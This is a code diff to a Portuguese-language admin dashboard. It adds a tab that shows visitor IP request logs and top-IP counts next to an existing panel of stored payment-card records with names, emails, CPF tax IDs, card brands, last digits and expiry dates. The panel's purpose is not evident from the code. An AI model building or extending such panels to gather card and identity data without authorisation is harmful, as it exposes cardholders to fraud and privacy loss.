@@ -56,6 +56,12 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 .btn.danger{color:var(--red);border-color:#fca5a5}
 .btn.danger:hover{background:var(--red-bg)}
 
+/* ── TABS ── */
+.tabs{display:flex;gap:0;background:var(--surface);border-bottom:1px solid var(--border);padding:0 28px}
+.tab{height:46px;padding:0 18px;font-size:13px;font-weight:500;color:var(--muted);background:none;border:none;border-bottom:2px solid transparent;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:7px;transition:color .15s,border-color .15s;margin-bottom:-1px}
+.tab:hover{color:var(--text)}
+.tab.active{color:var(--accent);border-bottom-color:var(--accent);font-weight:600}
+
 /* ── STATS ── */
 .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border-bottom:1px solid var(--border)}
 .stat{background:var(--surface);padding:18px 24px}
@@ -64,6 +70,19 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 
 /* ── CONTENT ── */
 .content{padding:24px 28px;max-width:1400px}
+
+/* ── LOGS ── */
+.log-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px}
+.log-stat{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:14px 18px}
+.log-stat .stat-lbl{font-size:11px;font-weight:600;color:var(--muted2);text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px}
+.log-stat .stat-val{font-size:20px;font-weight:700;color:var(--text)}
+.ip-badge{display:inline-block;font-family:'Courier New',monospace;font-size:12px;background:#f0f4ff;border:1px solid #c7d7f9;border-radius:5px;padding:2px 8px;color:#2563eb;font-weight:500}
+.method-badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;letter-spacing:.5px}
+.m-get{background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
+.m-post{background:#eff6ff;color:#2563eb;border:1px solid #bfdbfe}
+.m-delete{background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
+.m-other{background:#f9fafb;color:#6b7280;border:1px solid #e5e7eb}
+.ua-cell{font-size:11px;color:var(--muted);max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 
 /* ── TOOLBAR ── */
 .toolbar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
@@ -213,46 +232,109 @@ tr:hover td{background:#fafbfd}
     </div>
   </div>
 
-  <div class="stats-row">
-    <div class="stat"><div class="stat-lbl">Total de cartões</div><div class="stat-val" id="statTotal">—</div></div>
-    <div class="stat"><div class="stat-lbl">Últimas 24h</div><div class="stat-val" id="statLast24">—</div></div>
-    <div class="stat"><div class="stat-lbl" id="sb1l">—</div><div class="stat-val" id="sb1v">0</div></div>
-    <div class="stat"><div class="stat-lbl" id="sb2l">—</div><div class="stat-val" id="sb2v">0</div></div>
+  <!-- TABS -->
+  <div class="tabs">
+    <button class="tab active" id="tabCards" onclick="switchTab('cards')">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><rect x="1" y="4" width="22" height="16" rx="2" stroke="currentColor" stroke-width="2"/><path d="M1 10h22" stroke="currentColor" stroke-width="2"/></svg>
+      Cartões
+    </button>
+    <button class="tab" id="tabLogs" onclick="switchTab('logs')">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 8v4l3 3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+      Logs de IPs
+    </button>
   </div>
 
-  <div class="content">
-    <div class="toolbar">
-      <div class="search-wrap">
-        <svg class="search-ico" width="14" height="14" viewBox="0 0 24 24" fill="none">
-          <circle cx="11" cy="11" r="8" stroke="currentColor" stroke-width="2"/>
-          <path d="M21 21l-4.35-4.35" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-        </svg>
-        <input class="search" id="searchInput" placeholder="Buscar nome, e-mail, bandeira, final…" oninput="debounce()"/>
-      </div>
-      <button class="btn" onclick="loadAll()">
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M23 4v6h-6M1 20v-6h6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        Atualizar
-      </button>
+  <!-- PAINEL CARTÕES -->
+  <div id="panelCards">
+    <div class="stats-row">
+      <div class="stat"><div class="stat-lbl">Total de cartões</div><div class="stat-val" id="statTotal">—</div></div>
+      <div class="stat"><div class="stat-lbl">Últimas 24h</div><div class="stat-val" id="statLast24">—</div></div>
+      <div class="stat"><div class="stat-lbl" id="sb1l">—</div><div class="stat-val" id="sb1v">0</div></div>
+      <div class="stat"><div class="stat-lbl" id="sb2l">—</div><div class="stat-val" id="sb2v">0</div></div>
     </div>
 
-    <div class="tbl-card">
-      <table>
-        <thead>
-          <tr>
-            <th>#</th>
-            <th>Nome / E-mail</th>
-            <th class="col-hide">CPF</th>
-            <th>Bandeira</th>
-            <th>Final</th>
-            <th>Validade</th>
-            <th class="col-hide">Cadastro</th>
-            <th></th>
-          </tr>
-        </thead>
-        <tbody id="tbody">
-          <tr><td colspan="8" class="empty">Carregando…</td></tr>
-        </tbody>
-      </table>
+    <div class="content">
+      <div class="toolbar">
+        <div class="search-wrap">
+          <svg class="search-ico" width="14" height="14" viewBox="0 0 24 24" fill="none">
+            <circle cx="11" cy="11" r="8" stroke="currentColor" stroke-width="2"/>
+            <path d="M21 21l-4.35-4.35" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <input class="search" id="searchInput" placeholder="Buscar nome, e-mail, bandeira, final…" oninput="debounce()"/>
+        </div>
+        <button class="btn" onclick="loadAll()">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M23 4v6h-6M1 20v-6h6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Atualizar
+        </button>
+      </div>
+
+      <div class="tbl-card">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Nome / E-mail</th>
+              <th class="col-hide">CPF</th>
+              <th>Bandeira</th>
+              <th>Final</th>
+              <th>Validade</th>
+              <th class="col-hide">Cadastro</th>
+              <th></th>
+            </tr>
+          </thead>
+          <tbody id="tbody">
+            <tr><td colspan="8" class="empty">Carregando…</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAINEL LOGS -->
+  <div id="panelLogs" style="display:none">
+    <div class="content">
+      <div class="log-stats">
+        <div class="log-stat"><div class="stat-lbl">Total de requisições</div><div class="stat-val" id="logTotal">—</div></div>
+        <div class="log-stat"><div class="stat-lbl">Últimas 24h</div><div class="stat-val" id="logLast24">—</div></div>
+        <div class="log-stat"><div class="stat-lbl">IPs únicos (top)</div><div class="stat-val" id="logUniq">—</div></div>
+      </div>
+
+      <div class="toolbar">
+        <button class="btn" onclick="loadLogs()">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M23 4v6h-6M1 20v-6h6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Atualizar
+        </button>
+      </div>
+
+      <div class="tbl-card" style="margin-bottom:16px">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>IP</th>
+              <th>Método</th>
+              <th>Rota</th>
+              <th class="col-hide">User-Agent</th>
+              <th>Horário</th>
+            </tr>
+          </thead>
+          <tbody id="logTbody">
+            <tr><td colspan="6" class="empty">Carregando…</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div style="font-size:12px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px">Top IPs</div>
+      <div class="tbl-card">
+        <table>
+          <thead>
+            <tr><th>IP</th><th>Requisições</th></tr>
+          </thead>
+          <tbody id="topIpTbody">
+            <tr><td colspan="2" class="empty">—</td></tr>
+          </tbody>
+        </table>
+      </div>
     </div>
   </div>
 </div>
@@ -417,6 +499,59 @@ async function exportar(){
 function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
 function cap(s){return s?s.charAt(0).toUpperCase()+s.slice(1):s;}
 document.addEventListener('keydown',e=>{if(e.key==='Escape'){closeDetail();closeConfirm();}});
+
+// ── TABS ──────────────────────────────────────────────────────────────────────
+function switchTab(tab){
+  document.getElementById('panelCards').style.display = tab==='cards' ? '' : 'none';
+  document.getElementById('panelLogs').style.display  = tab==='logs'  ? '' : 'none';
+  document.getElementById('tabCards').classList.toggle('active', tab==='cards');
+  document.getElementById('tabLogs').classList.toggle('active',  tab==='logs');
+  if(tab==='logs') loadLogs();
+}
+
+// ── LOGS ──────────────────────────────────────────────────────────────────────
+async function loadLogs(){
+  await Promise.all([loadLogStats(), loadLogTable()]);
+}
+
+async function loadLogStats(){
+  try{
+    const r=await fetch('/api/admin/logs/stats',{headers:{'x-admin-token':_tok}});
+    if(!r.ok)return;
+    const d=await r.json();
+    document.getElementById('logTotal').textContent=d.total.toLocaleString('pt-BR');
+    document.getElementById('logLast24').textContent=d.last24.toLocaleString('pt-BR');
+    document.getElementById('logUniq').textContent=(d.topIps||[]).length;
+    const tb=document.getElementById('topIpTbody');
+    if(!d.topIps||!d.topIps.length){tb.innerHTML='<tr><td colspan="2" class="empty">—</td></tr>';return;}
+    tb.innerHTML=d.topIps.map(x=>`<tr>
+      <td><span class="ip-badge">${esc(x.ip||'—')}</span></td>
+      <td style="font-weight:600">${x.count.toLocaleString('pt-BR')}</td>
+    </tr>`).join('');
+  }catch(e){console.error(e);}
+}
+
+async function loadLogTable(){
+  try{
+    const r=await fetch('/api/admin/logs?limit=500',{headers:{'x-admin-token':_tok}});
+    if(!r.ok)return;
+    const d=await r.json();
+    const tb=document.getElementById('logTbody');
+    if(!d.logs||!d.logs.length){tb.innerHTML='<tr><td colspan="6" class="empty">Nenhum log encontrado.</td></tr>';return;}
+    tb.innerHTML=d.logs.map((l,i)=>{
+      const mCls=l.method==='GET'?'m-get':l.method==='POST'?'m-post':l.method==='DELETE'?'m-delete':'m-other';
+      const dt=l.created_at?new Date(l.created_at).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit'}):'—';
+      return`<tr>
+        <td style="color:var(--muted2);font-size:12px;font-family:monospace">${i+1}</td>
+        <td><span class="ip-badge">${esc(l.ip||'—')}</span></td>
+        <td><span class="method-badge ${mCls}">${esc(l.method||'—')}</span></td>
+        <td style="font-family:monospace;font-size:12px">${esc(l.path||'—')}</td>
+        <td class="ua-cell col-hide" title="${esc(l.user_agent||'')}">${esc(l.user_agent||'—')}</td>
+        <td class="dt">${dt}</td>
+      </tr>`;
+    }).join('');
+  }catch(e){console.error(e);}
+}
 </script>
 </body>
 </html>
